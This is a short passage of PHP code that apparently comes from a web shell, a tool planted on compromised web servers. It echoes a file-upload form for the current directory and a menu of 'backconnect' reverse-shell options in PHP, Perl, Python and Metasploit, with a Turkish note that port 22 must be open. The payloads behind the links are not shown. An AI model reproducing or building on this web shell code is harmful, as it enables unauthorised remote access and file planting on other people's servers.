action="'.$me.'" method=post enctype=multipart/form-data>Upload :
<input size=50 type=file name=ff > <input type=hidden name=ad
value='.getcwd().'><input type=submit
value=Send></form>'.$form.'Modeminizde 22 port a&#231;&#305;k
olmal&#305; : <a href="?BackConnect=PHP_1"><font color="green">Php
Backconnect 1</font></a>
&nbsp;&nbsp;<a href="?BackConnect=PHP_2"><font color="red">Php
Backconnect 2</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_3"><font
color="orange">Php Backconnect 3</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_13"><font color="orange">Php Backconnect
4</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_4"><font
color="pink">Dc Backconnect</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_21"><font
color="white">Perlsocket</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_5"><font color="yellow">Python
Bacconnect</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_17"><font
color="red">Python izo</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_12"><font color="brown">Metasploit
Bacconnect</font></a></form>';
?>
